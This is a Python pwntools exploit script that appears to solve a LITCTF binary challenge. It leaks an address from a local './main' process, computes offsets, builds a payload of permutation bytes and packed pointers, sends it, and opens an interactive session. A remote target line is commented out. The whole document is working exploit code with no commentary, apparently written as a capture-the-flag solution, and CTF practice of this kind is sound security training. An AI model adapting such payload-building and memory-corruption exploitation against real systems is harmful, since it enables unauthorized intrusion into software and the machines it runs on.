
from pwn import *
from itertools import permutations

elf = context.binary = ELF("./main")
context.log_level = "debug"

io = process()
# gdb.attach(io)
# io= remote("litctf.org", 31780)
io.recvuntil(b"= ")
a_addr = int(io.recvline().strip(), 16)

elf.address = a_addr - 0x4120
vuln_addr  = elf.address + 0x4040

sup = "123412314231243121342132413214321"[:-1]
vuln_bytes = bytes(int(ch) - 1 for ch in sup)
assert len(vuln_bytes) == 32

present = {}
for i in range(32 - 3):
    w = tuple(vuln_bytes[i:i+4])
    if sorted(w) == [0,1,2,3] and w not in present:
        present[w] = i

all_perms = list(permutations([0,1,2,3]))
missing = next(p for p in all_perms if p not in present)
assert len(present) == 23

ptr_targets = [vuln_addr + present[p] for p in sorted(present.keys())]
ptr_targets.append(a_addr)

a_bytes = bytes(missing)

payload = vuln_bytes + b''.join(p64(x) for x in ptr_targets) + a_bytes
assert len(payload) == 0xE4

io.send(payload)
io.interactive()
